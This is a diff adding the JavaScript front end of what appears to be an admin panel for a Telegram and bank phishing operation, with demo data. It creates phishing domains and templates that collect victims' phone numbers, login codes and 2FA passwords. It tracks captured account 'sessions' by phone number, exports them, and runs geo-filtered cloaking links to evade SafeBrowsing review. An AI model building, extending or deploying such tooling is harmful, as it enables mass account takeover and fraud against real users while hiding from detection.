+               phone_label:'Telefon raqamingiz:',phone_placeholder:'90 123 45 67',
+               phone_prefix:'+998',button:'Olish',copyright:'Barcha huquqlar himoyalangan',
+               error_text:"Telefon formati noto'g'ri..."},
+         code:{h1:'Kodni kiriting',subtitle:"Tasdiqlash kodini olish uchun...",
+               code_placeholder:'12345',button:'Davom etish',
+               error_text:'Kodni tekshiring va qayta kiriting.'},
+         twofa:{h1:'Ikki bosqichli tasdiqlash',subtitle:"Akkauntingizda ikki bosqichli...",
+                password_placeholder:'••••••••',button:'Tasdiqlash',
+                error_text:"Parol noto'g'ri. Qayta urinib..."},
+         done:{h1:'Muvaffaqiyatli!',subtitle:'Siz navbatga muvaffaqiyatli...'},
+       },
+       theme:{body_bg:'#0e1f3d',gradient_from:'#15326e',gradient_to:'#0e1f3d',
+              accent_color:'#3ca1eb',text_color:'#ffffff'}},
+      {id:2,name:'Bank_Template',domains:1,sessions:34},
+    ],
+  },
+  notifications:[
+    {id:1,unread:true,icId:'ic-warn',color:'warn',title:'domain.com — SafeBrowsing',sub:'Google пометил · 2 часа назад'},
+    {id:2,unread:true,icId:'ic-funnel-done',color:'ok',title:'+7(999)123·· — сессия готова',sub:'Telegram_v2 · evil.com · 5ч'},
+    {id:3,unread:true,icId:'ic-skull',color:'err',title:'+7(903)456·· — сессия мертва',sub:'evil-domain.com · вчера'},
+    {id:4,unread:false,icId:'ic-gear',color:'acc',title:'pending-domain.ru — активен',sub:'NS делегированы · 3 дня назад'},
+  ],
+  logbot:{connected:true,name:'@my_log_bot',chat:'-1001234567890',
+    triggers:{done:true,phone:true,twofa:true,code:false,bad_code:false,page:false}},
+  user:{username:'@username',tg_id:5984466650},
+  stats:{
+    funnel:{clicks:12044,loads:10880,phones:8923,codes:6711,twofa:2344,done:1420},
+    conversion:11.8,
+    topDomains:[
+      {name:'evil-domain.com',done:142,conv:11.8},
+      {name:'second-site.com',done:89,conv:14.2},
+      {name:'third.net',done:34,conv:8.1},
+    ],
+    geo:[
+      {code:'RU',flag:'🇷🇺',count:6234,pct:52},
+      {code:'UA',flag:'🇺🇦',count:2011,pct:16},
+      {code:'BY',flag:'🇧🇾',count:980,pct:8},
+      {code:'KZ',flag:'🇰🇿',count:601,pct:5},
+      {code:'XX',flag:'🌍',count:2218,pct:19,other:true},
+    ],
+  },
+};
+
+/* ============ HELPERS ============ */
+const $ = (s,r=document)=>r.querySelector(s);
+const $$ = (s,r=document)=>[...r.querySelectorAll(s)];
+const esc = (s)=>String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+
+function toast(msg,err){
+  const t=$('#toast');
+  t.textContent=msg;
+  t.classList.toggle('err',!!err);
+  t.style.display='block';
+  clearTimeout(t._h);
+  t._h=setTimeout(()=>t.style.display='none',2200);
+}
+
+function openSheet(html){
+  $('#sheet-body').innerHTML=html;
+  $('#sheet').classList.add('show');
+  $('#sheet-bg').classList.add('show');
+  document.body.classList.add('sheet-open');
+}
+function closeSheet(){
+  $('#sheet').classList.remove('show');
+  $('#sheet-bg').classList.remove('show');
+  document.body.classList.remove('sheet-open');
+}
+
+function confirmSheet(title,body,onYes,danger){
+  openSheet(`
+    <div class="sheet-title">${esc(title)}</div>
+    <div class="t-muted mb-m" style="line-height:1.55">${body}</div>
+    <div class="row gap-s">
+      <button class="btn ghost" onclick="closeSheet()">Отмена</button>
+      <button class="btn ${danger?'danger':''}" id="conf-yes">Подтвердить</button>
+    </div>`);
+  $('#conf-yes').onclick=()=>{closeSheet();onYes&&onYes();};
+}
+
+function funnelRow(icId,lbl,val,max){
+  const pct=Math.round(val/max*100);
+  return `<div class="funnel-row">
+    <span class="ico-cell"><svg class="svgi x16"><use href="#${icId}"/></svg></span>
+    <span class="lbl">${esc(lbl)}</span>
+    <span class="val">${val.toLocaleString('ru')}</span>
+    <div class="bar"><i style="width:${pct}%"></i></div>
+  </div>`;
+}
+
+function funnelBlock(f){
+  const max=Math.max(...Object.values(f));
+  return `
+    ${funnelRow('ic-funnel-eye','Клики',f.clicks,max)}
+    ${funnelRow('ic-funnel-doc','Загрузка',f.loads||f.load||0,max)}
+    ${funnelRow('ic-funnel-phone','Телефоны',f.phones,max)}
+    ${funnelRow('ic-funnel-msg','Коды',f.codes,max)}
+    ${funnelRow('ic-funnel-key','2FA',f.twofa,max)}
+    ${funnelRow('ic-funnel-done','Завершено',f.done,max)}
+  `;
+}
+
+const CHEV = `<svg class="chev-svg"><use href="#ic-chev"/></svg>`;
+
+function statusPill(s){
+  const map={
+    done:['ok','✅ done'],
+    '2fa':['warn','⏳ 2fa'],
+    dead:['err','💀 dead'],
+    spamblock:['err','🚫 spam'],
+    exported:['muted','📦 exported'],
+    active:['ok','● ACTIVE'],
+    pending:['warn','⏳ PENDING'],
+    error:['err','❌ ERROR'],
+  };
+  const [cls,txt]=map[s]||['muted',s];
+  return `<span class="pill ${cls}">${esc(txt)}</span>`;
+}
+
+/* ============ NAV / ROUTER ============ */
+const nav = {
+  stack:[{screen:'home'}],
+  cur(){return this.stack[this.stack.length-1];},
+  go(screen,params){
+    this.stack.push({screen,params:params||{}});
+    this._render();
+  },
+  back(){
+    if(this.stack.length>1){this.stack.pop();this._render();}
+  },
+  goTab(tab){
+    this.stack=[{screen:tab}];
+    this._render();
+  },
+  _render(){
+    const cur=this.cur();
+    const fn = screens[cur.screen];
+    if(!fn){ $('#content').innerHTML=`<div class="empty"><div class="ic">404</div><div class="ttl">Экран не найден</div></div>`; return; }
+    const out=fn(cur.params||{});
+    $('#content').innerHTML=out.html;
+    $('#screen-title').textContent=out.title||'EVA';
+    $('#screen-sub').textContent=out.sub||'';
+    $('#backbtn').classList.toggle('show', this.stack.length>1);
+    // Tab highlight
+    const rootTab = out.tab || cur.screen;
+    $$('.tab').forEach(t=>t.classList.toggle('active', t.dataset.tab===rootTab));
+    // scroll top
+    $('#content').scrollTop=0;
+    out.after && out.after();
+  }
+};
+$$('.tab').forEach(t=>t.onclick=()=>nav.goTab(t.dataset.tab));
+
+/* ============ SCREENS ============ */
+const screens = {};
+
+/* ---- HOME ---- */
+screens.home = ()=>{
+  const k=DATA.kpi;
+  const alerts=DATA.alerts.length ? `
+    <div class="section-label">Алерты</div>
+    ${DATA.alerts.map(a=>`
+      <div class="alert ${a.sev==='warn'?'warn':''}" onclick="nav.go('domainCard',{id:${a.ref.id}})">
+        <div class="ic" style="color:var(--${a.sev==='warn'?'warn':'err'})"><svg class="svgi"><use href="#${a.icId}"/></svg></div>
+        <div class="grow">
+          <div class="ttl">${esc(a.title)}</div>
+          <div class="sb">${esc(a.sub)}</div>
+        </div>
+        <span class="chev">${CHEV}</span>
+      </div>
+    `).join('')}` : '';
+
+  return {
+    title:'EVA', sub:'Dashboard', tab:'home',
+    html:`
+      <div class="kpis">
+        <div class="kpi"><div class="v">${k.total.toLocaleString('ru')}</div><div class="k">Сессий всего</div></div>
+        <div class="kpi"><div class="v mag">+${k.today}</div><div class="k">Сегодня</div><div class="delta up">+${k.todayDelta}% к вчера</div></div>
+        <div class="kpi"><div class="v">${k.activeDomains}</div><div class="k">Активных доменов</div></div>
+        <div class="kpi"><div class="v mag">${k.conversion}%</div><div class="k">Конверсия</div><div class="delta up">+${k.conversionDelta}% за неделю</div></div>
+      </div>
+      ${alerts}
+      <div class="section-label">Последние сессии</div>
+      ${DATA.sessions.slice(0,5).map(s=>`
+        <div class="srow" onclick="nav.go('sessionCard',{id:${s.id}})">
+          <div class="grow">
+            <div class="phone">${esc(s.phone.replace(/\d{2}-\d{2}$/,'··'))}</div>
+            <div class="meta">${esc(s.status)} · ${s.premium?'⭐ Premium':'——'} · ${s.ago}</div>
+          </div>
+          <span class="chev">${CHEV}</span>
+        </div>
+      `).join('')}
+      <button class="btn ghost mt-m" onclick="nav.goTab('sessions')">Все сессии →</button>
+    `
+  };
+};
+
+/* ---- DOMAINS LIST ---- */
+screens.domains = (p)=>{
+  const filter=p.filter||{type:'all',status:'all',sb:'all',sort:'date'};
+  const list=DATA.domains.filter(d=>{
+    if(filter.type!=='all' && d.type!==filter.type) return false;
+    if(filter.status!=='all' && d.status!==filter.status) return false;
+    return true;
+  });
+  return {
+    title:'Домены', tab:'domains',
+    html:`
+      <div class="row between mb-s">
+        <span class="t-label">Всего: ${DATA.domains.length}</span>
+        <button class="btn small" onclick="openCreateDomain()"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-plus"/></svg>Домен</button>
+      </div>
+      <div class="search">
+        <svg class="svgi x16" style="color:var(--muted)"><use href="#ic-search"/></svg>
+        <input placeholder="Поиск по домену..." oninput="searchDomains(this.value)">
+        <span class="filt" onclick="openDomainFilter()"><svg class="svgi x16"><use href="#ic-filter"/></svg></span>
+      </div>
+      <div id="domains-list">${renderDomainsList(list)}</div>
+      <button class="btn ghost mt-m">Загрузить ещё</button>
+    `
+  };
+};
+
+function renderDomainsList(list){
+  if(!list.length) return `<div class="empty"><div class="ic">∅</div><div class="ttl">Доменов нет</div><div class="sb">Добавь первый домен — пропишешь NS, дальше всё автоматом.</div><button class="btn small" onclick="openCreateDomain()"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-plus"/></svg>Домен</button></div>`;
+  return list.map(d=>{
+    let body='';
+    if(d.status==='active' && d.type==='phishing'){
+      const s=d.stats;
+      body=`<div class="t-muted">phishing · <span class="t-ok">ACTIVE</span> · CF: ✅</div>
+        <div class="row gap-m mt-s">
+          <span>✅ <span class="num t-mag">${s.done}</span></span>
+          <span>📱 <span class="num">${s.phones}</span></span>
+          <span>🔑 <span class="num">${s.twofa}</span></span>
+        </div>
+        <div class="t-muted mt-s">шаблон: ${esc(d.template)}</div>`;
+    } else if(d.status==='active' && d.type==='cloaking'){
+      body=`<div class="t-muted">cloaking · <span class="t-ok">ACTIVE</span> · CF: ✅</div>
+        <div class="row gap-m mt-s">
+          <span>👁 <span class="num t-mag">${d.stats.clicks.toLocaleString('ru')}</span> кликов</span>
+        </div>`;
+    } else if(d.status==='pending'){
+      body=`<div class="t-muted">${esc(d.type)} · <span class="t-warn">PENDING NS</span></div>
+        <div class="t-muted mt-s">Жду NS:<br>${d.ns.map(n=>esc(n)).join('<br>')}</div>`;
+    } else if(d.status==='error'){
+      body=`<div class="t-muted">${esc(d.type)} · <span class="t-err">ERROR</span></div>
+        <div class="t-err mt-s" style="font-size:11px">${esc(d.err||'')}</div>`;
+    }
+    return `<div class="card" onclick="nav.go('domainCard',{id:${d.id}})">
+      <div class="row between">
+        <div class="grow">
+          <div class="row gap-s"><span class="t-acc">${d.status==='pending'?'⏳':d.status==='error'?'❌':'●'}</span><b style="font-size:14px">${esc(d.fqdn)}</b></div>
+          ${body}
+        </div>
+        <span class="chev">${CHEV}</span>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function searchDomains(q){
+  q=q.toLowerCase();
+  const list=DATA.domains.filter(d=>d.fqdn.toLowerCase().includes(q));
+  $('#domains-list').innerHTML=renderDomainsList(list);
+}
+
+function openDomainFilter(){
+  const chip = (label,active)=>`<div class="chip${active?' active':''}" onclick="pickChip(this)">${esc(label)}</div>`;
+  openSheet(`
+    <div class="sheet-title">Фильтр</div>
+    <div class="field-row">
+      <div class="lbl">Тип</div>
+      <div class="row gap-s">${chip('Все',true)}${chip('Phishing')}${chip('Cloaking')}</div>
+    </div>
+    <div class="field-row">
+      <div class="lbl">Статус</div>
+      <div class="row gap-s wrap">${chip('Все',true)}${chip('Active')}${chip('Pending')}${chip('Error')}</div>
+    </div>
+    <div class="field-row">
+      <div class="lbl">SafeBrowsing</div>
+      <div class="row gap-s">${chip('Все',true)}${chip('Clean')}${chip('Flagged')}</div>
+    </div>
+    <div class="field-row">
+      <div class="lbl">Сортировка</div>
+      <div class="row gap-s wrap">${chip('По дате',true)}${chip('По сессиям')}${chip('По конверсии')}${chip('По кликам')}</div>
+    </div>
+    <button class="btn" onclick="closeSheet();toast('Фильтр применён')">Применить</button>
+  `);
+}
+function pickChip(el){
+  el.parentElement.querySelectorAll('.chip').forEach(c=>c.classList.remove('active'));
+  el.classList.add('active');
+}
+
+/* ---- CREATE DOMAIN ---- */
+function openCreateDomain(){
+  openSheet(`
+    <div class="sheet-title">Новый домен</div>
+    <div class="field-row">
+      <div class="lbl">FQDN</div>
+      <input class="input" id="cd-fqdn" placeholder="lorem.com">
+    </div>
+    <div class="field-row">
+      <div class="lbl">Тип</div>
+      <div class="row gap-s">
+        <div class="radio active" onclick="this.classList.add('active');this.nextElementSibling.classList.remove('active')"><span class="dot"></span><span>Phishing</span></div>
+        <div class="radio" onclick="this.classList.add('active');this.previousElementSibling.classList.remove('active')"><span class="dot"></span><span>Cloaking</span></div>
+      </div>
+    </div>
+    <div class="field-row">
+      <div class="lbl">Шаблон (для phishing)</div>
+      <select class="select"><option>Telegram_v2</option><option>Bank_Template</option><option>Telegram Premium (default)</option></select>
+    </div>
+    <div class="field-row">
+      <div class="lbl">Redirect URL (опционально)</div>
+      <input class="input" placeholder="https://t.me/...">
+    </div>
+    <button class="btn" onclick="onDomainCreated()">Создать домен</button>
+  `);
+}
+function onDomainCreated(){
+  openSheet(`
+    <div class="sheet-title">✅ Домен создан!</div>
+    <div class="t-muted mb-m">Пропишите NS у регистратора:</div>
+    <div class="codeblock mb-s" onclick="copyText('ns1.cloudflare.com')">ns1.cloudflare.com  📋</div>
+    <div class="codeblock mb-m" onclick="copyText('ns2.cloudflare.com')">ns2.cloudflare.com  📋</div>
+    <div class="t-muted mb-m" style="line-height:1.55">Статус обновится автоматически<br>(~5–30 минут после делегирования)</div>
+    <button class="btn" onclick="closeSheet();nav.goTab('domains');toast('Домен создан')">Понятно</button>
+  `);
+}
+function copyText(t){ navigator.clipboard&&navigator.clipboard.writeText(t); toast('Скопировано'); }
+
+/* ---- DOMAIN CARD ---- */
+screens.domainCard = (p)=>{
+  const d=DATA.domains.find(x=>x.id===p.id);
+  if(!d) return {title:'Домен', tab:'domains', html:`<div class="empty"><div class="ic">∅</div><div class="ttl">Домен не найден</div></div>`};
+  const s=d.stats||{};
+  const funnel = d.type==='phishing' && s.clicks ? `
+    <div class="section-label">Воронка — 7 дней</div>
+    <div class="card static">${funnelBlock(s)}</div>
+  ` : '';
+  return {
+    title:d.fqdn, tab:'domains',
+    html:`
+      <div class="row gap-s mb-s">
+        ${statusPill(d.status)}
+        <span class="pill muted">${esc(d.type)}</span>
+        ${d.cf?'<span class="pill ok">CF ✓</span>':''}
+        ${d.sb==='clean'?'<span class="pill ok">SB Clean</span>':''}
+      </div>
+      ${d.zone?`<div class="t-muted">CF Zone: ${esc(d.zone)}</div>`:''}
+      ${d.created?`<div class="t-muted">Создан: ${esc(d.created)}</div>`:''}
+      ${d.status==='pending'?`<div class="card static"><div class="t-label mb-s">Жду NS</div>${d.ns.map(n=>`<div class="codeblock mb-s" onclick="copyText('${esc(n)}')">${esc(n)} 📋</div>`).join('')}</div>`:''}
+      ${d.status==='error'?`<div class="card static"><div class="t-err">${esc(d.err)}</div></div>`:''}
+      ${funnel}
+      ${d.status==='active' && d.type==='phishing' ? `
+        <div class="section-label">Настройки домена</div>
+        <div class="card static">
+          <div class="row between mb-s"><span class="t-label">Шаблон</span><span>${esc(d.template)} <span class="chev">${CHEV}</span></span></div>
+          <div class="row between mb-s"><span class="t-label">Redirect</span><span class="t-muted nowrap" style="overflow:hidden;text-overflow:ellipsis;max-width:60%">${esc(d.redirect||'—')}</span></div>
+          <div class="row between"><span class="t-label">FB Pixel</span><span class="t-muted">—</span></div>
+          <button class="btn ghost small mt-m" onclick="openEditDomain(${d.id})">✏️ Редактировать</button>
+        </div>
+        <div class="section-label">Ссылки</div>
+        <div class="card" onclick="nav.go('phishLinks',{domainId:${d.id}})">
+          <div class="row between">
+            <span>📎 lorem — <b>${(d.phishLinks||[]).length}</b></span>
+            <span class="chev">${CHEV}</span>
+          </div>
+        </div>
+      `:''}
+      ${d.status==='active' && d.type==='cloaking' ? `
+        <div class="section-label">Cloaking-ссылки</div>
+        <div class="card" onclick="nav.go('cloakLinks',{domainId:${d.id}})">
+          <div class="row between">
+            <span>🎭 ссылки — <b>${(d.cloakLinks||[]).length}</b></span>
+            <span class="chev">${CHEV}</span>
+          </div>
+        </div>
+      `:''}
+      <div class="actbar">
+        <button class="btn ghost small" onclick="domainMenu(${d.id})"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-dots"/></svg>Меню</button>
+        <button class="btn danger small" onclick="deleteDomain(${d.id})"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-trash"/></svg>Удалить</button>
+      </div>
+    `
+  };
+};
+
+function domainMenu(id){
+  openSheet(`
+    <div class="sheet-title">Действия</div>
+    <button class="btn ghost mb-s" onclick="closeSheet();toast('Проверка запущена')">Проверить NS вручную</button>
+    <button class="btn ghost mb-s" onclick="closeSheet();copyText('${esc(DATA.domains.find(d=>d.id===id).fqdn)}')">Скопировать FQDN</button>
+    <button class="btn ghost" onclick="closeSheet()">Открыть в браузере</button>
+  `);
+}
+function openEditDomain(id){
+  openSheet(`
+    <div class="sheet-title">Редактирование</div>
+    <div class="field-row"><div class="lbl">Шаблон</div><select class="select"><option>Telegram_v2</option><option>Bank_Template</option></select></div>
+    <div class="field-row"><div class="lbl">Redirect URL</div><input class="input" value="https://t.me/durov"></div>
+    <div class="field-row"><div class="lbl">Facebook Pixel ID</div><input class="input" placeholder="123456789"></div>
+    <button class="btn" onclick="closeSheet();toast('Сохранено')">Сохранить</button>
+  `);
+}
+function deleteDomain(id){
+  const d=DATA.domains.find(x=>x.id===id);
+  openSheet(`
+    <div class="sheet-title">Удалить домен?</div>
+    <div class="t-muted mb-m" style="line-height:1.55">Введите название домена <b class="t-err">${esc(d.fqdn)}</b> для подтверждения:</div>
+    <input class="input mb-m" id="del-conf" placeholder="${esc(d.fqdn)}">
+    <button class="btn danger" onclick="(function(){const v=document.getElementById('del-conf').value;if(v==='${esc(d.fqdn)}'){closeSheet();nav.back();toast('Домен удалён');}else{toast('Название не совпадает',true);}})()">Удалить</button>
+  `);
+}
+
+/* ---- PHISH LINKS LIST ---- */
+screens.phishLinks = (p)=>{
+  const d=DATA.domains.find(x=>x.id===p.domainId);
+  return {
+    title:'lorem-ссылки', sub:d.fqdn, tab:'domains',
+    html:`
+      <div class="row between mb-s">
+        <span class="t-label">${d.fqdn}</span>
+        <button class="btn small" onclick="openCreatePhishLink(${d.id})"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-plus"/></svg>Ссылка</button>
+      </div>
+      ${(d.phishLinks||[]).map(l=>`
+        <div class="card static">
+          <div class="row between mb-s">
+            <span>📎 <b>${esc(l.label)}</b></span>
+            <span class="t-mag num">${l.conv}%</span>
+          </div>
+          <div class="codeblock mb-s" onclick="copyText('${esc(d.fqdn)}/${esc(l.slug)}')">${esc(d.fqdn)}/${esc(l.slug)}</div>
+          <div class="row gap-m t-muted mb-s" style="font-size:11px">
+            <span>👁 ${l.clicks}</span><span>📱 ${l.phones}</span><span>✅ ${l.done}</span>
+          </div>
+          <div class="row gap-s">
+            <button class="icobtn" onclick="copyText('${esc(d.fqdn)}/${esc(l.slug)}')" title="URL"><svg class="svgi"><use href="#ic-copy"/></svg></button>
+            <button class="icobtn" onclick="nav.go('linkStats',{domainId:${d.id},linkId:${l.id}})" title="Стат"><svg class="svgi"><use href="#ic-bars"/></svg></button>
+            <button class="icobtn" onclick="toast('Отправлено в LogBot')" title="Bot"><svg class="svgi"><use href="#ic-send"/></svg></button>
+            <button class="icobtn danger" onclick="confirmSheet('Удалить ссылку?','Действие нельзя отменить.',()=>toast('Удалено'),true)"><svg class="svgi"><use href="#ic-trash"/></svg></button>
+          </div>
+        </div>
+      `).join('')}
+    `
+  };
+};
+
+function openCreatePhishLink(did){
+  openSheet(`
+    <div class="sheet-title">Новая ссылка</div>
+    <div class="field-row"><div class="lbl">Метка (источник трафика)</div><input class="input" placeholder="traffic_vk"></div>
+    <div class="field-row"><div class="lbl">Slug (опционально)</div><input class="input" placeholder="custom-path  или авто"></div>
+    <button class="btn" onclick="closeSheet();toast('Ссылка создана')">Создать</button>
+  `);
+}
+
+/* ---- LINK STATS ---- */
+screens.linkStats = (p)=>{
+  const d=DATA.domains.find(x=>x.id===p.domainId);
+  const l=d.phishLinks.find(x=>x.id===p.linkId);
+  const f={clicks:l.clicks,loads:l.clicks-42,phones:l.phones,codes:110,twofa:78,done:l.done};
+  return {
+    title:l.label, sub:d.fqdn, tab:'domains',
+    html:`
+      <div class="seg">
+        <div class="s">День</div><div class="s active">7д</div><div class="s">30д</div><div class="s">Всё</div>
+      </div>
+      <div class="section-label">Воронка</div>
+      <div class="card static">${funnelBlock(f)}</div>
+      <div class="section-label">Таймлайн</div>
+      <div class="card static">
+        <div style="font-family:'Share Tech Mono';color:var(--accent);line-height:1.2;white-space:pre;text-shadow:0 0 8px rgba(0,255,209,.4)">
+ ╭─╮╭──╮    ╭╮
+─╯ ╰╯  ╰────╯╰───────
+ пн  вт  ср  чт  пт  сб  вс</div>
+      </div>
+      <div class="section-label">Гео ТОП-5</div>
+      <div class="card static">
+        ${DATA.stats.geo.map(g=>`
+          <div class="funnel-row" style="grid-template-columns:24px 1fr 60px 80px">
+            <span style="font-size:14px">${g.flag}</span>
+            <span class="lbl">${g.code} · ${Math.round(g.count*0.06)}</span>
+            <span class="val">${g.pct}%</span>
+            <div class="bar"><i style="width:${g.pct*1.6}%"></i></div>
+          </div>
+        `).join('')}
+      </div>
+      <div class="section-label">Последние клики</div>
+      <div class="card static">
+        <div class="t-muted" style="font-size:12px;line-height:1.8">
+          2м  · RU · Android · Chrome<br>
+          5м  · UA · iPhone  · Safari<br>
+          12м · RU · Windows · Chrome
+        </div>
+      </div>
+    `
+  };
+};
+
+/* ---- CLOAK LINKS LIST ---- */
+screens.cloakLinks = (p)=>{
+  const d=DATA.domains.find(x=>x.id===p.domainId);
+  return {
+    title:'lorem-ссылки', sub:d.fqdn, tab:'domains',
+    html:`
+      <div class="row between mb-s">
+        <span class="t-label">${d.fqdn}</span>
+        <button class="btn small" onclick="nav.go('cloakLinkEdit',{domainId:${d.id}})"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-plus"/></svg>Ссылка</button>
+      </div>
+      ${(d.cloakLinks||[]).map(l=>`
+        <div class="card static">
+          <div class="row between mb-s">
+            <span>🎭 <b>/${esc(l.slug)}</b></span>
+            <span class="t-mag num">${l.total}</span>
+          </div>
+          <div class="t-muted mb-s" style="font-size:11.5px;line-height:1.7">
+            Offer:  <span class="t-acc">${esc(l.offer)}</span><br>
+            White:  <span class="t-acc">${esc(l.white)}</span><br>
+            Гео:    ${l.geoMode==='whitelist'?'Whitelist':l.geoMode==='blacklist'?'Blacklist':'Off'} ${l.countries.map(c=>flagOf(c)).join(' ')}
+          </div>
+          <div class="t-muted mb-s" style="font-size:11px">👁 total: ${l.total} · offer: ${l.offerCount}</div>
+          <div class="row gap-s">
+            <button class="icobtn" onclick="nav.go('cloakLinkEdit',{domainId:${d.id},linkId:${l.id}})" title="Редактировать"><svg class="svgi"><use href="#ic-edit"/></svg></button>
+            <button class="icobtn" onclick="copyText('${esc(d.fqdn)}/${esc(l.slug)}')" title="URL"><svg class="svgi"><use href="#ic-copy"/></svg></button>
+            <button class="icobtn" onclick="toast('Отправлено в LogBot')" title="Bot"><svg class="svgi"><use href="#ic-send"/></svg></button>
+            <button class="icobtn danger" onclick="confirmSheet('Удалить ссылку?','Действие нельзя отменить.',()=>toast('Удалено'),true)"><svg class="svgi"><use href="#ic-trash"/></svg></button>
+          </div>
+        </div>
+      `).join('')}
+    `
+  };
+};
+function flagOf(c){return ({RU:'🇷🇺',BY:'🇧🇾',KZ:'🇰🇿',UA:'🇺🇦',US:'🇺🇸'})[c]||'🏳';}
+
+screens.cloakLinkEdit = (p)=>{
+  const d=DATA.domains.find(x=>x.id===p.domainId);
+  const l=p.linkId ? d.cloakLinks.find(x=>x.id===p.linkId) : {slug:'',offer:'',white:'',geoMode:'off',countries:[]};
+  return {
+    title:p.linkId?'Редактирование':'Новая lorem-ссылка', tab:'domains',
+    html:`
+      <div class="field-row">
+        <div class="lbl">Slug</div>
+        <div class="row gap-s">
+          <span class="t-muted nowrap">${esc(d.fqdn)}/</span>
+          <input class="input" value="${esc(l.slug)}" placeholder="promo">
+        </div>
+      </div>
+      <div class="field-row"><div class="lbl">Offer URL</div><input class="input" value="${esc(l.offer)}" placeholder="https://real-offer.com/p"></div>
+      <div class="field-row"><div class="lbl">White URL</div><input class="input" value="${esc(l.white)}" placeholder="https://t.me/channel"></div>
+      <div class="field-row">
+        <div class="lbl">Гео-фильтр</div>
+        <div class="v">
+          <div class="radio ${l.geoMode==='off'?'active':''}" onclick="cloakMode(this,'off')"><span class="dot"></span><span>Выключен — все на оффер</span></div>
+          <div class="radio ${l.geoMode==='whitelist'?'active':''}" onclick="cloakMode(this,'whitelist')"><span class="dot"></span><span>Whitelist — только выбранные</span></div>
+          <div class="radio ${l.geoMode==='blacklist'?'active':''}" onclick="cloakMode(this,'blacklist')"><span class="dot"></span><span>Blacklist — все кроме выбранных</span></div>
+        </div>
+      </div>
+      <div class="field-row">
+        <div class="lbl">Страны</div>
+        <div class="row gap-s wrap">
+          ${l.countries.map(c=>`<div class="chip active">${flagOf(c)} ${c} ✕</div>`).join('')}
+          <div class="chip" onclick="toast('Выбор страны')">+</div>
+        </div>
+      </div>
+      <button class="btn" onclick="nav.back();toast('Сохранено')">Сохранить</button>
+    `
+  };
+};
+function cloakMode(el,mode){
+  el.parentElement.querySelectorAll('.radio').forEach(r=>r.classList.remove('active'));
+  el.classList.add('active');
+}
+
+/* ---- SESSIONS LIST ---- */
+let SESS_FILT={status:'all',selected:new Set()};
+screens.sessions = ()=>{
+  const list=DATA.sessions.filter(s=>SESS_FILT.status==='all'||s.status===SESS_FILT.status);
+  return {
+    title:'Сессии', tab:'sessions',
+    html:`
+      <div class="row between mb-s">
+        <span class="t-label">Всего: ${DATA.sessions.length}</span>
+        <button class="btn small ghost" onclick="openSessionFilter()">⚙ фильтр</button>
+      </div>
+      <div class="chips">
+        ${['all','done','2fa','dead'].map(s=>`<div class="chip ${SESS_FILT.status===s?'active':''}" onclick="SESS_FILT.status='${s}';nav._render()">${s==='all'?'Все':s}</div>`).join('')}
+        <div class="chip" onclick="toast('Экспорт начат')">📦 export</div>
+      </div>
+      <div class="card tight static row between" id="bulkbar">
+        <div class="check ${SESS_FILT.selected.size===list.length&&list.length?'on':''}" onclick="toggleAllSess()"><span class="box"></span><span>Выбрать все (${SESS_FILT.selected.size} выбрано)</span></div>
+        <button class="btn tiny" onclick="bulkActions()">Действие ▼</button>
+      </div>
+      ${list.map(s=>`
+        <div class="card static">
+          <div class="row gap-s">
+            <div class="check ${SESS_FILT.selected.has(s.id)?'on':''}" onclick="event.stopPropagation();toggleSess(${s.id})"><span class="box"></span></div>
+            <div class="grow" onclick="nav.go('sessionCard',{id:${s.id}})">
+              <div class="row between"><b style="font-size:13.5px">${esc(s.phone)}</b><span class="chev">${CHEV}</span></div>
+              <div class="row gap-s mt-s">${statusPill(s.status)}${s.premium?'<span class="pill mag"><svg class="svgi x14" style="margin-right:3px"><use href="#ic-star"/></svg>Premium</span>':''}</div>
+              <div class="t-muted mt-s">${s.contacts?s.contacts+' контактов · ':''}${esc(s.domain)}</div>
+              <div class="t-muted">${esc(s.link)} · ${s.ago} назад</div>
+            </div>
+          </div>
+        </div>
+      `).join('')}
+      <button class="btn ghost mt-m">Загрузить ещё</button>
+    `
+  };
+};
+function toggleSess(id){
+  if(SESS_FILT.selected.has(id)) SESS_FILT.selected.delete(id);
+  else SESS_FILT.selected.add(id);
+  nav._render();
+}
+function toggleAllSess(){
+  const ids=DATA.sessions.filter(s=>SESS_FILT.status==='all'||s.status===SESS_FILT.status).map(s=>s.id);
+  if(SESS_FILT.selected.size===ids.length) SESS_FILT.selected.clear();
+  else ids.forEach(i=>SESS_FILT.selected.add(i));
+  nav._render();
+}
+function bulkActions(){
+  if(!SESS_FILT.selected.size) return toast('Сначала выберите',true);
+  openSheet(`
+    <div class="sheet-title">Действия (${SESS_FILT.selected.size})</div>
+    <button class="btn ghost mb-s" onclick="closeSheet();toast('Проверка запущена')">✅ Проверить (макс 50)</button>
+    <button class="btn ghost mb-s" onclick="closeSheet();toast('Экспорт начат')">📦 Экспортировать</button>
+    <button class="btn danger" onclick="closeSheet();confirmSheet('Удалить выбранные?','${SESS_FILT.selected.size} сессий будут удалены.',()=>{SESS_FILT.selected.clear();nav._render();toast('Удалены');},true)">🗑 Удалить</button>
+  `);
+}
+function openSessionFilter(){
+  openSheet(`
+    <div class="sheet-title">Фильтр сессий</div>
+    <div class="field-row">
+      <div class="lbl">Статус</div>
+      <div class="row gap-s wrap">
+        ${['done','2fa','dead','spamblock','exported'].map(s=>`<div class="chip">${s}</div>`).join('')}
+      </div>
+    </div>
+    <div class="field-row">
+      <div class="lbl">Флаги</div>
+      <div class="check"><span class="box"></span><span>Только Premium</span></div>
+      <div class="check"><span class="box"></span><span>Только SpamBlock</span></div>
+    </div>
+    <div class="field-row"><div class="lbl">Поиск по номеру</div><input class="input" placeholder="+7..."></div>
+    <div class="row gap-s">
+      <div class="field-row grow"><div class="lbl">Дата от</div><input class="input" type="date"></div>
+      <div class="field-row grow"><div class="lbl">Дата до</div><input class="input" type="date"></div>
+    </div>
+    <div class="row gap-s">
+      <div class="field-row grow"><div class="lbl">Контактов min</div><input class="input" type="number" placeholder="0"></div>
+      <div class="field-row grow"><div class="lbl">Контактов max</div><input class="input" type="number" placeholder="∞"></div>
+    </div>
